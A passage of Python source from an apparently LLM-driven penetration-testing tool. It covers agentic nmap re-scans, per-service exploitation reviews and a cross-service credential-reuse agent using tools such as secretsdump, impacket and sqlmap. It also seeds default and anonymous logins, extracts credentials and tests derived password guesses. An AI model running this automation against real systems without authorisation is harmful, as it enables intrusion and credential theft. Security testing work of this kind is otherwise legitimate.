# tools so it can re-run a scan with different parameters when the defaults fell short
# (wider port range, slower timing, UDP, higher version intensity, OS detection, a
# specific NSE script). Service-specific tools (web/ftp/smb/… enum) belong to phase 5.
_REVIEW_TOOLS = {"port_discovery", "service_discovery", "script_scan"}

_REVIEW_SYSTEM = (
    "You are a penetration-testing assistant reviewing the automated NMAP recon "
    "(port scan, service/version detection, NSE) already run against the target — its "
    "findings are given below. Your only job here is to judge whether that nmap recon "
    "was SUFFICIENT, and if not, re-run nmap with BETTER PARAMETERS via the tools "
    "provided. Examples: a firewalled/laggy host that may have dropped ports → slower "
    "timing or a wider/full port range; ports that looked filtered → different host "
    "discovery; a service that came back unknown/tcpwrapped → higher version intensity "
    "or OS detection; a specific product/version → a targeted NSE script. Only re-scan "
    "when the current results look incomplete or unreliable — otherwise do nothing. Do "
    "NOT do service-specific exploitation, brute-force or credentialed actions (that is "
    "the next phase). When done, reply with a 1-3 line summary of what (if anything) "
    "the extra nmap runs changed, then stop.")

_REVIEW_TASK = ("Review the nmap recon above. If it looks complete and reliable, say so "
                "and stop. Otherwise re-run nmap with better parameters (range/timing/"
                "UDP/version-intensity/OS/NSE) where it clearly helps, then summarise.")


_AGENT_SECRET_ARGS = {"password", "hash", "bearer", "api_token"}


def _print_agent_call(label: str, tool: str, args: dict, num=None) -> None:
    line = Text("  ")
    line.append("[running" + (f" {num}" if num else "") + "]", style="default")
    line.append(f" ▸ {label} · {tool}")
    prev = ", ".join(f"{k}={v}" for k, v in list(args.items())[:4]
                     if v not in (None, "") and k not in _AGENT_SECRET_ARGS)
    if any(k in args and args[k] for k in _AGENT_SECRET_ARGS):
        prev += (", " if prev else "") + "creds=***"
    if prev:
        line.append(f"  ({prev})", style="bright_black")
    console.print(line)


def _print_agent_result(label: str, tool: str, result: dict, num=None) -> None:
    snippet = "\n".join((result.get("text") or "").strip().splitlines()[:8])
    line = Text("  ")
    line.append("[complete" + (f" {num}" if num else "") + "]", style="default")
    line.append(f" ▸ {label} · {tool}")
    if snippet:
        line.append("\n")
        for ln in snippet.splitlines():
            line.append("        " + ln + "\n", style="bright_black")
    console.print(line)


def _print_agent_dup(label: str, tool: str) -> None:
    """A repeated call (same tool + args) the model tried again — short-circuited."""
    line = Text("  ")
    line.append("[skipped]", style="bright_black")
    line.append(f" ▸ {label} · {tool}", style="bright_black")
    line.append("  (duplicate — reusing earlier result)", style="bright_black")
    console.print(line)


def _print_agent_summary(label_text: str, summary: str) -> None:
    console.print(Text(f"  ✓ {label_text} — ", style="green").append(
        summary.splitlines()[0] if summary else "done", style="green"))
    for ln in summary.splitlines()[1:]:
        console.print(Text("      " + ln, style="green"))


def _start_targeted_review(eng: dict) -> None:
    """Phase 4.5 entry: run the review in the background, then chain to phase 5."""
    threading.Thread(target=_review_worker, args=(eng,), daemon=True).start()


def _review_worker(eng: dict) -> None:
    try:
        _run_targeted_review(eng)
    except Exception:                                  # noqa: BLE001
        pass
    finally:
        eng["thinking"] = False
        _invalidate_toolbar(eng["ctx"])
        _post(eng["ctx"], lambda: _start_service_exploitation(eng))   # → phase 5


def _run_hacktools_agent(eng, allowed, system_prompt, task, intro, label,
                         summary_label, store_service, store_step,
                         max_rounds, max_calls, budget_min, store_port=0) -> None:
    """Bounded agentic loop over a chosen subset of the hacktools MCP tools, seeded
    with the target's findings. The model calls tools, reacts to their output, and
    finally summarises; the summary is stored (tagged with store_port, 0 for a
    whole-host step). Shared by the phase-4.5 nmap review, the phase-5 per-service
    review, and the phase-5 cross-service exploitation layer. No-ops when a model, the
    MCP client, or the hacktools server isn't available."""
    ctx, base_dir = eng["ctx"], eng["base_dir"]
    profile, mcp = ctx.get("profile"), ctx.get("mcp")
    if not profile or mcp is None or not _supports_tool_loop(profile) \
            or eng.get("cancelled"):
        return
    try:
        tools = [t for t in mcp.all_tools()
                 if mcp_client.split_namespaced(t["name"])[0] == "hacktools"
                 and mcp_client.split_namespaced(t["name"])[1] in allowed
                 and _tool_available(t)]              # skip tools whose program is missing
    except Exception:                                  # noqa: BLE001
        return
    if not tools:
        return
    schemas = [t["schema"] for t in tools]
    dbctx = _target_db_context(base_dir) or ""
    system = "\n\n".join(p for p in (system_prompt, _env_block(), dbctx) if p)
    msgs = [{"role": "system", "content": system},
            {"role": "user", "content": task}]
    endpoint, api_key = _openai_endpoint(profile, base_dir)
    custom_params = psai._parse_custom_params(profile)
    deadline = time.time() + budget_min * 60
    calls = 0
    seen: dict = {}          # (tool, canonical args) -> prior result text, for dedup
    if intro:
        _post(ctx, lambda: console.print(Text("  ▸ " + intro, style="bright_black")))

    for _round in range(max_rounds):
        if eng.get("cancelled") or time.time() > deadline:
            break
        body = {"model": profile.get("model", ""), "messages": msgs,
                "tools": schemas, "tool_choice": "auto",
                "temperature": AGENT_TEMPERATURE}
        if custom_params:
            body.update(custom_params)
        eng["thinking"] = True
        _invalidate_toolbar(ctx)
        parts: list = []
        try:
            message = _chat_stream(endpoint, api_key, body, lambda t: parts.append(t),
                                   hide_thinking=True, render_reasoning=False,
                                   max_seconds=AGENT_TURN_MAX_SECONDS)
        except Exception:                              # noqa: BLE001
            break
        finally:
            eng["thinking"] = False
            _invalidate_toolbar(ctx)
        tool_calls = message.get("tool_calls") or []
        if not tool_calls:                             # model is done → summarise
            summary = (message.get("content") or "".join(parts)).strip()
            if summary:
                _post(ctx, lambda s=summary: _print_agent_summary(summary_label, s))
                try:
                    purragent_db.add_exploit_finding(base_dir, eng["tid"],
                        store_port, "tcp", store_service, store_step, "", summary)
                    eng.setdefault("exploit_findings", []).append(
                        {"port": store_port, "finding": summary})
                except Exception:                      # noqa: BLE001
                    pass
            return
        msgs.append(message)
        for tc in tool_calls:
            call_id = tc.get("id")
            if (calls >= max_calls or time.time() > deadline
                    or eng.get("cancelled")):
                msgs.append({"role": "tool", "tool_call_id": call_id,
                             "content": "Budget reached — summarise and stop."})
                continue
            fn = tc.get("function", {})
            name = fn.get("name", "")
            try:
                args = json.loads(fn.get("arguments") or "{}")
            except json.JSONDecodeError:
                args = {}
            srv, bare = mcp_client.split_namespaced(name)
            if srv != "hacktools" or bare not in allowed:
                msgs.append({"role": "tool", "tool_call_id": call_id,
                             "content": "That tool is not available in this step."})
                continue
            key = bare + ":" + json.dumps(args, sort_keys=True, default=str)
            if key in seen:                            # identical call already run
                _post(ctx, lambda lb=label, b=bare: _print_agent_dup(lb, b))
                msgs.append({"role": "tool", "tool_call_id": call_id,
                             "content": "You already ran this exact call; its result "
                             "was:\n" + seen[key] + "\nDo not repeat it — try a "
                             "different tool or arguments, or stop and summarise."})
                continue
            calls += 1
            cno = _next_seq(eng)                        # engagement-wide, pairs running/complete
            _post(ctx, lambda lb=label, b=bare, ar=args, n=cno:
                  _print_agent_call(lb, b, ar, num=n))
            try:
                # No explicit budget — the client waits per the tool's advertised
                # timeout, then kills it.
                result = mcp.call(name, args)
            except Exception as exc:                   # noqa: BLE001
                result = {"text": f"error: {exc}", "isError": True}
            _post(ctx, lambda lb=label, b=bare, r=result, n=cno:
                  _print_agent_result(lb, b, r, num=n))
            text = result.get("text") or "(no output)"
            seen[key] = text
            msgs.append({"role": "tool", "tool_call_id": call_id, "content": text})


def _run_targeted_review(eng: dict) -> None:
    """Phase 4.5: nmap-only review — re-run scans with better parameters if needed."""
    _run_hacktools_agent(
        eng, allowed=_REVIEW_TOOLS, system_prompt=_REVIEW_SYSTEM, task=_REVIEW_TASK,
        intro="targeted review — the model may run a few precise checks",
        label="review", summary_label="targeted review", store_service="review",
        store_step="targeted review", max_rounds=REVIEW_MAX_ROUNDS,
        max_calls=REVIEW_MAX_TOOLCALLS, budget_min=REVIEW_BUDGET_MINUTES)


# ── phase 5 per-service review (LLM over a RAG-picked hacktools subset) ────────
# After a service's deterministic no-credential enum finishes, the model looks at THAT
# service's findings + the exact commands already run, and decides whether any further
# enumeration/exploitation command adds value — mirroring the phase-4.5 review, but
# scoped to one service. Tools are RAG-selected from the safe exploit set (no brute /
# no creds it doesn't have — that stays for the deterministic gate). Tight budget since
# it runs once per service. Cross-service correlation is left to the final agent below.
SERVICE_REVIEW_MAX_ROUNDS = 3
SERVICE_REVIEW_MAX_TOOLCALLS = 5
SERVICE_REVIEW_BUDGET_MINUTES = 5
_SERVICE_REVIEW_SYSTEM = (
    "You are a penetration tester reviewing ONE service after its deterministic "
    "no-credential enumeration. Below are the findings for this service and the exact "
    "commands already run against it. Decide whether any FURTHER enumeration or "
    "exploitation command would add real value here, and if so run it via the tools. "
    "Do NOT repeat any command already run. Do NOT brute-force and do NOT use "
    "credentials you were not given (those are handled elsewhere). Stay on THIS host "
    "and THIS service. If nothing more is worth running, reply with a one-line note "
    "saying so and stop.")


def _service_review_allowed(base_dir: str, mcp, need: str) -> set:
    """RAG-pick the hacktools most relevant to this service's findings, narrowed to the
    safe exploit set (brute/creds tools stay out). Falls back to the whole safe set when
    embeddings are unavailable, so the review still works without RAG."""
    universe = _EXPLOIT_AGENT_TOOLS
    try:
        r = _get_retriever(base_dir, mcp.all_tools())
        if r:
            picked = {mcp_client.split_namespaced(n)[1]
                      for n, _ in r.retrieve(need, top_n=12)}
            picked &= universe
            if picked:
                return picked
    except Exception:                                  # noqa: BLE001
        pass
    return universe


def _service_review_task(port: int, key: str, label: str, findings: list,
                         cmds: list) -> str:
    """Compact per-service prompt: what the service is, what was found, what already ran."""
    finds = "\n".join(f"- {f}" for f in findings) or "- (no findings recorded)"
    ran = "\n".join(f"$ {c}" for c in cmds) or "(none ran)"
    return (f"Service: {port}/{key} — {label}\n\n"
            f"Findings so far for this service:\n{finds}\n\n"
            f"Commands already run against this service (do not repeat these):\n{ran}\n\n"
            "Decide whether any further enumeration/exploitation adds value here; run it "
            "with the tools if so, otherwise say there is nothing more and stop.")


def _run_service_review(eng: dict, port: int, proto: str, key: str, label: str,
                        findings: list, cmds: list) -> None:
    """Phase-5 per-service review: bounded LLM follow-up over a RAG-picked hacktools
    subset, scoped to a single service. No-op without model / MCP / hacktools."""
    ctx = eng["ctx"]
    mcp = ctx.get("mcp")
    if mcp is None or eng.get("cancelled"):
        return
    need = f"{key} {label} " + " ".join(str(f) for f in findings)
    allowed = _service_review_allowed(eng["base_dir"], mcp, need)
    _run_hacktools_agent(
        eng, allowed=allowed, system_prompt=_SERVICE_REVIEW_SYSTEM,
        task=_service_review_task(port, key, label, findings, cmds),
        intro=f"reviewing {port}/{key} — the model may run a few more checks",
        label="review", summary_label=f"{port}/{key} review",
        store_service=f"review:{key}", store_step=f"{port}/{key} review",
        max_rounds=SERVICE_REVIEW_MAX_ROUNDS, max_calls=SERVICE_REVIEW_MAX_TOOLCALLS,
        budget_min=SERVICE_REVIEW_BUDGET_MINUTES, store_port=port)


# ── phase 5 cross-service exploitation layer (LLM over hacktools) ──────────────
# After every service has been enumerated and per-service-reviewed, one final agent
# does what a per-service pass structurally can't: CROSS-SERVICE correlation — reuse a
# credential or artefact found on one service against another (FTP creds on SMB, a
# config password on a DB). Bounded (rounds / tool-calls / time); no brute-force, no
# broad scanning, single host. Skipped cleanly with no model / MCP / hacktools.
EXPLOIT_AGENT_MAX_ROUNDS = 5
EXPLOIT_AGENT_MAX_TOOLCALLS = 8
EXPLOIT_AGENT_BUDGET_MINUTES = 10
_EXPLOIT_AGENT_TOOLS = {
    "smb_client", "netexec_smb", "ldap_search", "rpc_enum", "secretsdump",
    "impacket_exec", "kerberos_roast", "enum4linux", "smbmap", "certipy",
    "bloodhound_python", "mysql_query", "mssql_query", "psql_query", "redis_cli",
    "mongo_query", "ssh_exec", "winrm_exec", "ftp_transfer", "sqlmap", "nuclei_scan",
    "wpscan", "http_request", "git_dump", "hash_identify", "default_creds",
    "cve_lookup", "payload_gen",
}
_EXPLOIT_AGENT_SYSTEM = (
    "You are a penetration tester doing a final CROSS-SERVICE pass. Every service has "
    "already been enumerated and individually reviewed; the combined findings — "
    "including any credentials or artefacts discovered — are below. Your job is the one "
    "thing a per-service review cannot do: CORRELATE ACROSS SERVICES. Reuse a "
    "credential or artefact found on one service against another (e.g. FTP creds on "
    "SMB, a config password against a database, a hash dumped from one host used to "
    "authenticate to another service). Pass credentials as the tools' typed "
    "parameters. Do NOT brute-force, do NOT scan the network broadly, do NOT repeat "
    "single-service enumeration already done, and stay on this host. When the useful "
    "cross-service follow-ups are exhausted, reply with a short summary and stop.")
_EXPLOIT_AGENT_TASK = (
    "Using the combined findings above, correlate across services: reuse any discovered "
    "credential or artefact from one service against the others where it clearly helps, "
    "then summarise. If there is nothing to correlate, say so briefly and stop.")


def _run_exploit_agent(eng: dict) -> None:
    """Phase 5 final layer: LLM-driven cross-service correlation over the exploitation
    hacktools (per-service depth is already handled by _run_service_review)."""
    _run_hacktools_agent(
        eng, allowed=_EXPLOIT_AGENT_TOOLS, system_prompt=_EXPLOIT_AGENT_SYSTEM,
        task=_EXPLOIT_AGENT_TASK,
        intro="cross-service correlation — reusing findings across services",
        label="exploit", summary_label="cross-service exploitation",
        store_service="exploit-agent",
        store_step="credentialed follow-up", max_rounds=EXPLOIT_AGENT_MAX_ROUNDS,
        max_calls=EXPLOIT_AGENT_MAX_TOOLCALLS, budget_min=EXPLOIT_AGENT_BUDGET_MINUTES)


# ── phase 5 credential harvest → validation (seed / extract / verify) ─────────
# Bridge from free-text findings to the (upcoming) deterministic brute gate. Three
# deterministic-in-decision steps run after the cross-service agent, before the report:
#   B  seed the always-worth-trying anonymous / null / passwordless logins,
#   D  have the model pull STRUCTURED credentials out of the findings (data only),
#   E  TEST every candidate with one real login each and mark it valid / invalid.
# Only a VALIDATED credential (or a working null/anon login) should later suppress
# brute-force — an extracted-but-unverified cred never does. No brute-force here: each
# credential gets exactly one authentication attempt.
CRED_VALIDATE_MAX = 40             # hard cap on validation logins per host
_CRED_VALIDATE_TIMEOUT = 45        # seconds per validation login

# B — per service class, the anonymous / null / passwordless logins cheap enough to
# always try first (username, secret, secret_type); '' means empty.
_NULL_ANON_CREDS = {
    "ftp":     [("anonymous", "", "none"), ("anonymous", "anonymous@", "none")],
    "smb":     [("", "", "none"), ("guest", "", "none")],
    "ldap":    [("", "", "none")],
    "redis":   [("", "", "none")],
    "mongodb": [("", "", "none")],
    "mysql":   [("root", "", "none")],
    "mssql":   [("sa", "", "none")],
    "psql":    [("postgres", "", "none")],
}


def _seed_null_anon_creds(eng: dict) -> int:
    """B: seed canonical anonymous/null/passwordless logins for each auth service present
    on the host, so validation tries them before any brute-force."""
    base, tid = eng["base_dir"], eng["tid"]
    present = {k for _p, _pr, _lb, k, _v in _exploit_order(base, tid)}
    n = 0
    for key in present & set(_NULL_ANON_CREDS):
        for user, secret, st in _NULL_ANON_CREDS[key]:
            try:
                purragent_db.add_credential(base, tid, user, secret, st,
                    scope="specific", service_hint=key, source="null-auth seed")
                n += 1
            except Exception:                          # noqa: BLE001
                pass
    return n


_CRED_EXTRACT_SYSTEM = (
    "You are a penetration tester. From the enumeration findings below, extract, grounded "
    "STRICTLY in the text (never guess or invent), two things:\n"
    "1) CREDENTIALS — entries that include a secret: username+password pairs, password "
    "hashes, private keys, or API tokens.\n"
    "2) USERNAMES — possible usernames with NO known secret: enumerated users, account "
    "names, email local-parts, names in configs/banners.\n"
    "Reply with ONLY a JSON object, no prose:\n"
    '{"credentials": [{"username": str, "secret": str, '
    '"type": "password|ntlm_hash|ssh_key|token", '
    '"service_hint": "<ssh/smb/ftp/mysql/… or *>", "source": "<where-from>", '
    '"confidence": <0.0-1.0>}], '
    '"usernames": [{"username": str, "service_hint": "<service or *>", '
    '"source": "<where-from>"}]}\n'
    "Put an entry in credentials ONLY if it has a secret; a bare username goes in "
    "usernames. If a section is empty use []. If nothing at all, reply: "
    '{"credentials": [], "usernames": []}')


def _parse_extraction(text: str):
    """Pull the {credentials:[…], usernames:[…]} object out of the model reply, tolerant
    of prose / code fences. Falls back to treating a bare array as credentials. Returns
    (creds, usernames); either may be [] — a bad reply must never crash the harvest."""
    if not text:
        return [], []
    m = re.search(r"\{.*\}", text, re.S)
    if m:
        try:
            obj = json.loads(m.group(0))
            if isinstance(obj, dict) and ("credentials" in obj or "usernames" in obj):
                creds = [d for d in (obj.get("credentials") or [])
                         if isinstance(d, dict)]
                users = [d for d in (obj.get("usernames") or [])
                         if isinstance(d, dict)]
                return creds, users
        except (ValueError, TypeError):
            pass
    m = re.search(r"\[.*\]", text, re.S)                # legacy: bare array = creds
    if m:
        try:
            data = json.loads(m.group(0))
            if isinstance(data, list):
                return [d for d in data if isinstance(d, dict)], []
        except (ValueError, TypeError):
            pass
    return [], []


def _extract_creds(eng: dict) -> int:
    """D: one tool-free LLM pass over the findings → structured creds AND usernames into
    the store (one call, two outputs). Returns the number of credentials stored."""
    profile = eng["ctx"].get("profile")
    if not profile or eng.get("cancelled"):
        return 0
    base, tid = eng["base_dir"], eng["tid"]
    findings = _report_context(base, tid)
    if not findings.strip():
        return 0
    body = {"model": profile.get("model", ""),
            "messages": [{"role": "system", "content": _CRED_EXTRACT_SYSTEM},
                         {"role": "user", "content": findings[:12000]}],
            "temperature": AGENT_TEMPERATURE}
    custom_params = psai._parse_custom_params(profile)
    if custom_params:
        body.update(custom_params)
    eng["thinking"] = True
    _invalidate_toolbar(eng["ctx"])
    try:
        endpoint, api_key = _openai_endpoint(profile, base)
        parts: list = []
        _chat_stream(endpoint, api_key, body, lambda t: parts.append(t),
                     hide_thinking=True, render_reasoning=False,
                     max_seconds=EXTRACT_TURN_MAX_SECONDS)
    except Exception:                                  # noqa: BLE001
        return 0
    finally:
        eng["thinking"] = False
        _invalidate_toolbar(eng["ctx"])
    creds, users = _parse_extraction("".join(parts))
    n = 0
    for c in creds:
        user, secret = str(c.get("username") or ""), str(c.get("secret") or "")
        hint = (str(c.get("service_hint") or "*").strip() or "*")
        if not secret:                                 # no secret → it's a username
            purragent_db.add_username(base, tid, user, source="extracted",
                                      service_hint=hint)
            continue
        st = (str(c.get("type") or "").strip().lower() or None)
        scope = "global" if hint == "*" else "specific"
        try:
            conf = float(c.get("confidence"))
        except (TypeError, ValueError):
            conf = None
        try:
            purragent_db.add_credential(base, tid, user, secret, st, scope=scope,
                service_hint=hint, source="extracted", confidence=conf)
            purragent_db.add_username(base, tid, user, source="cred",
                                      service_hint=hint)   # cred user → brute pool too
            n += 1
        except Exception:                              # noqa: BLE001
            pass
    for u in users:
        purragent_db.add_username(base, tid, str(u.get("username") or ""),
                                  source="extracted",
                                  service_hint=(str(u.get("service_hint") or "*")))
    return n


# E — one login attempt per (credential, service). Each entry: arg-builder → (tool, args)
# or None when the credential can't apply (e.g. a passwordless non-anon cred on ssh), and
# a success test over the tool output. netexec ([+]) covers smb/mssql/winrm.
def _v_ssh(c, host, port):
    if not c["username"]:
        return None
    args = {"host": host, "port": port, "username": c["username"], "command": "id"}
    if c.get("secret_type") == "ssh_key" and c["secret"]:
        args["key"] = c["secret"]
    elif c["secret"]:
        args["password"] = c["secret"]
    else:
        return None
    return "ssh_exec", args


def _v_ftp(c, host, port):
    return "ftp_transfer", {"host": host, "port": port, "action": "list",
                            "username": c["username"] or "anonymous",
                            "password": c["secret"]}


def _v_smb(c, host, port):
    args = {"host": host, "action": "shares", "username": c["username"]}
    if c.get("secret_type") == "ntlm_hash" and c["secret"]:
        args["hash"] = c["secret"]
    else:
        args["password"] = c["secret"]
    return "netexec_smb", args


def _v_mssql(c, host, port):
    return "mssql_query", {"host": host, "username": c["username"],
                           "password": c["secret"], "query": "SELECT 1",
                           "local_auth": True}


def _v_winrm(c, host, port):
    if not c["username"]:
        return None
    args = {"host": host, "username": c["username"], "command": "whoami"}
    if c.get("secret_type") == "ntlm_hash" and c["secret"]:
        args["hash"] = c["secret"]
    elif c["secret"]:
        args["password"] = c["secret"]
    else:
        return None
    return "winrm_exec", args


def _v_mysql(c, host, port):
    return "mysql_query", {"host": host, "port": port,
                           "username": c["username"] or "root",
                           "password": c["secret"], "query": "SELECT 1"}


def _v_psql(c, host, port):
    return "psql_query", {"host": host, "port": port,
                          "username": c["username"] or "postgres",
                          "password": c["secret"], "query": "SELECT 1"}


def _v_ldap(c, host, port):
    args = {"host": host, "port": port, "filter": "(objectClass=*)"}
    if c["username"]:
        args["username"], args["password"] = c["username"], c["secret"]
    return "ldap_search", args


def _v_redis(c, host, port):
    return "redis_cli", {"host": host, "port": port, "password": c["secret"],
                         "command": "INFO server"}


def _v_mongo(c, host, port):
    args = {"host": host, "port": port, "command": "db.getMongo().getDBNames()"}
    if c["username"]:
        args["username"], args["password"] = c["username"], c["secret"]
    return "mongo_query", args


def _is_anon_cred(cred) -> bool:
    """A null / guest / anonymous login (empty username, or guest/anonymous, with no
    secret) — the one case where SMB's guest fallback IS the intended positive result."""
    if not cred:
        return False
    u = (cred.get("username") or "").strip().lower()
    return not cred.get("secret") and u in ("", "guest", "anonymous")


def _ok_nxc(t, e, cred=None):
    """netexec success. Guard against SMB guest FALLBACK: when guest access is enabled,
    nxc prints [+] …(Guest) for ANY credential, which would make every guess look valid.
    A (Guest) result only counts for an explicitly anonymous/guest/null credential."""
    if "[+]" not in t and "pwn3d" not in t.lower():
        return False
    if "(guest)" in t.lower():
        return _is_anon_cred(cred)
    return True
def _ok_ssh(t, e, cred=None):   return not e and "uid=" in t
def _ok_ftp(t, e, cred=None):   return not e and "530" not in t and "denied" not in t.lower()
def _ok_mysql(t, e, cred=None): return not e and "access denied" not in t.lower() \
                            and "error 1045" not in t.lower()
def _ok_psql(t, e, cred=None):  return not e and "authentication failed" not in t.lower() \
                            and "fatal" not in t.lower()
def _ok_redis(t, e, cred=None): return "redis_version" in t
def _ok_ldap(t, e, cred=None):
    low = t.lower()
    return not e and "invalid credentials" not in low and "ldap_bind" not in low \
        and any(m in low for m in ("dn:", "numentries", "search result", "objectclass"))
def _ok_mongo(t, e, cred=None):
    low = t.lower()
    return not e and not any(m in low for m in (
        "authentication failed", "requires authentication", "mongoservererror"))


_CRED_VALIDATORS = {
    "ssh":     (_v_ssh, _ok_ssh),     "ftp":   (_v_ftp, _ok_ftp),
    "smb":     (_v_smb, _ok_nxc),     "mssql": (_v_mssql, _ok_nxc),
    "winrm":   (_v_winrm, _ok_nxc),   "mysql": (_v_mysql, _ok_mysql),
    "psql":    (_v_psql, _ok_psql),   "ldap":  (_v_ldap, _ok_ldap),
    "redis":   (_v_redis, _ok_redis), "mongodb": (_v_mongo, _ok_mongo),
}
_CRED_AUTH_SERVICES = set(_CRED_VALIDATORS)


def _cred_display(cred: dict) -> str:
    """A safe one-line label: username + masked secret (secrets never printed)."""
    user = cred["username"] or "∅"
    if not cred["secret"]:
        sec = "(empty)"
    else:
        sec = "***"
    st = cred.get("secret_type")
    tag = f" [{st}]" if st and st not in ("none", "password") else ""
    return f"{user}:{sec}{tag}"


def _print_cred_result(state: str, cred: dict, key: str, port: int) -> None:
    color = "green" if state in ("valid", "derived") else "bright_black"
    line = Text("  ")
    line.append(f"[{state}]", style=color)
    line.append(f" ▸ cred · {key}  {_cred_display(cred)}", style=color)
    if state in ("valid", "derived"):
        line.append(f"  → {port}", style="green")
    console.print(line)


def _present_services(base_dir: str, tid: int) -> dict:
    """{service_key: [ports]} for the target, in exploitation-priority order."""
    present: dict = {}
    for port, _proto, _label, key, _ver in _exploit_order(base_dir, tid):
        present.setdefault(key, []).append(port)
    return present


def _attempt_login(mcp, host: str, present: dict, cred: dict, budget: list):
    """Try `cred` (dict with username/secret/secret_type/service_hint) against its
    candidate services, one login each, until one works or the shared attempt budget
    (budget[0]) runs out. Returns (tested, hit_key, hit_port)."""
    hint = cred.get("service_hint") or "*"
    keys = list(present) if hint == "*" else [hint]
    tested = False
    for key in keys:
        if key not in _CRED_VALIDATORS or key not in present:
            continue
        arg_fn, ok_fn = _CRED_VALIDATORS[key]
        ports = present[key]
        port = 445 if key == "smb" and 445 in ports else ports[0]   # prefer 445 over 139
        if budget[0] <= 0:
            return tested, None, None
        built = arg_fn(cred, host, port)
        if not built:
            continue
        tool, args = built
        tested = True
        budget[0] -= 1
        name = mcp_client._namespaced("hacktools", tool)
        try:
            res = mcp.call(name, args, timeout=_CRED_VALIDATE_TIMEOUT)
        except Exception:                              # noqa: BLE001
            res = {"text": "", "is_error": True}
        is_err = bool(res.get("is_error") or res.get("isError"))
        if ok_fn(res.get("text") or "", is_err, cred):
            return tested, key, port
    return tested, None, None


def _validate_creds(eng: dict) -> None:
    """E: try each candidate credential against its service(s) with a single login, and
    record valid/invalid. Bounded and cancel-aware; no brute-force."""
    ctx = eng["ctx"]
    mcp = ctx.get("mcp")
    if mcp is None or eng.get("cancelled"):
        return
    base, tid, host = eng["base_dir"], eng["tid"], eng["ip"]
    present = _present_services(base, tid)
    if not (set(present) & _CRED_AUTH_SERVICES):
        return
    budget = [CRED_VALIDATE_MAX]
    for c in purragent_db.fetch_credentials(base, tid):
        if eng.get("cancelled") or budget[0] <= 0:
            break
        if c.get("validated"):                         # already decided (seed/brute)
            continue
        tested, hit_key, hit_port = _attempt_login(mcp, host, present, c, budget)
        if hit_key:
            purragent_db.set_cred_validated(base, c["id"], True, hit_port)
            _post(ctx, lambda cc=c, k=hit_key, p=hit_port:
                  _print_cred_result("valid", cc, k, p))
        elif tested:
            purragent_db.set_cred_validated(base, c["id"], False)
            hint = c.get("service_hint") or "*"
            _post(ctx, lambda cc=c, k=(hint if hint != "*" else "?"):
                  _print_cred_result("invalid", cc, k, 0))


def _run_cred_harvest(eng: dict) -> None:
    """Phase-5 credential harvest: seed null/anon (B) → LLM-extract (D) → validate (E).
    Runs only when the host has an auth-capable service. No-op cleanly otherwise."""
    ctx, base, tid = eng["ctx"], eng["base_dir"], eng["tid"]
    if eng.get("cancelled"):
        return
    present = {k for _p, _pr, _lb, k, _v in _exploit_order(base, tid)}
    if not (present & _CRED_AUTH_SERVICES):
        return
    _post(ctx, lambda: console.print(Text(
        "  ▸ credential check — collect and verify logins before brute-force",
        style="bright_black")))
    _seed_null_anon_creds(eng)
    _extract_creds(eng)
    _validate_creds(eng)
    creds = purragent_db.fetch_credentials(base, tid)
    valid = [c for c in creds if c.get("validated") == 1]
    users = purragent_db.fetch_usernames(base, tid)
    _post(ctx, lambda n=len(creds), v=len(valid), u=len(users): console.print(Text(
        f"    {v} valid / {n} candidate credential(s) · {u} username(s) for brute",
        style=("green" if valid else "bright_black"))))


# ── phase 5 credential derivation (deduced guesses, validated before brute) ────
# A narrow, quiet tier between validation and brute: build candidate logins DEDUCED from
# what we already know — username-as-password (kali:kali), known-password × known-username
# reuse across services, light username mutations, and a few product defaults — then test
# each with one real login (reusing the validation machinery). Hits are stored as
# validated 'derived' creds, which the brute gate then skips. Deterministic (no LLM),
# hard-capped so it can't degrade into a hidden brute.
DERIVE_VALIDATE_MAX = 150          # hard cap on derivation login attempts per host
DERIVE_BUDGET_MINUTES = 8          # wall-clock ceiling for the derivation step
_DERIVE_SUFFIXES = ["123", "1", "!", "12345", "2024", "2025"]
_DEFAULT_CREDS = {                 # per service class: a few classic defaults
    "ssh":    [("root", "root"), ("admin", "admin")],
    "ftp":    [("ftp", "ftp"), ("admin", "admin")],
    "mysql":  [("root", "root"), ("root", "mysql")],
    "psql":   [("postgres", "postgres")],
    "mssql":  [("sa", "sa")],
    "smb":    [("administrator", "administrator")],
    "rdp":    [("administrator", "administrator")],
    "telnet": [("root", "root"), ("admin", "admin")],
}


def _derive_candidates(base_dir: str, tid: int, present: dict) -> list:
    """Build deduced (username, secret) login candidates from the known users/secrets,
    highest-signal first, deduped against credentials already in the store."""
    creds = purragent_db.fetch_credentials(base_dir, tid)
    users, seen_u = [], set()
    for u in ([r["username"] for r in purragent_db.fetch_usernames(base_dir, tid)]
              + [c["username"] for c in creds if c["username"]]):
        if u and u not in seen_u:
            seen_u.add(u)
            users.append(u)
    secrets, seen_s = [], set()
    for c in creds:
        s = c["secret"]
        if s and s not in seen_s and c.get("secret_type") in (None, "", "password", "none"):
            seen_s.add(s)
            secrets.append(s)
    existing = {(c["username"], c["secret"]) for c in creds}
    cands: list = []

    def _add(user, secret, hint="*"):
        if not user or not secret or (user, secret) in existing:
            return
        existing.add((user, secret))
        cands.append({"username": user, "secret": secret,
                      "secret_type": "password", "service_hint": hint})

    for u in users:                                    # 2: username as password
        _add(u, u)
    for u in users:                                    # 1: password reuse across accounts
        for s in secrets:
            _add(u, s)
    for key in present:                                # 5: product defaults
        for du, dp in _DEFAULT_CREDS.get(key, []):
            _add(du, dp, hint=key)
    for u in users:                                    # 3: light mutations (lowest signal)
        for suf in _DERIVE_SUFFIXES:
            _add(u, u + suf)
    return cands


def _run_cred_derivation(eng: dict) -> None:
    """Test deduced login candidates (see _derive_candidates) with one login each; store
    the hits as validated 'derived' creds. Bounded, cancel-aware, no brute-force."""
    ctx = eng["ctx"]
    mcp = ctx.get("mcp")
    if mcp is None or eng.get("cancelled"):
        return
    base, tid, host = eng["base_dir"], eng["tid"], eng["ip"]
    creds = purragent_db.fetch_credentials(base, tid)
    # Skip services we can already log into (a validated cred, incl. anon/guest access) —
    # guessing more logins there is pointless and, on SMB guest-fallback, floods the store.
    present = {k: ports for k, ports in _present_services(base, tid).items()
               if not _service_has_login(creds, k, ports[0])}
    if not (set(present) & _CRED_AUTH_SERVICES):
        return
    cands = _derive_candidates(base, tid, present)
    if not cands:
        return
    _post(ctx, lambda n=len(cands): console.print(Text(
        f"  ▸ credential derivation — testing {n} deduced login(s)",
        style="bright_black")))
    budget = [DERIVE_VALIDATE_MAX]
    deadline = time.time() + DERIVE_BUDGET_MINUTES * 60
    found = 0
    for cand in cands:
        if eng.get("cancelled") or budget[0] <= 0 or time.time() > deadline:
            break
        _tested, hit_key, hit_port = _attempt_login(mcp, host, present, cand, budget)
        if hit_key:
            try:
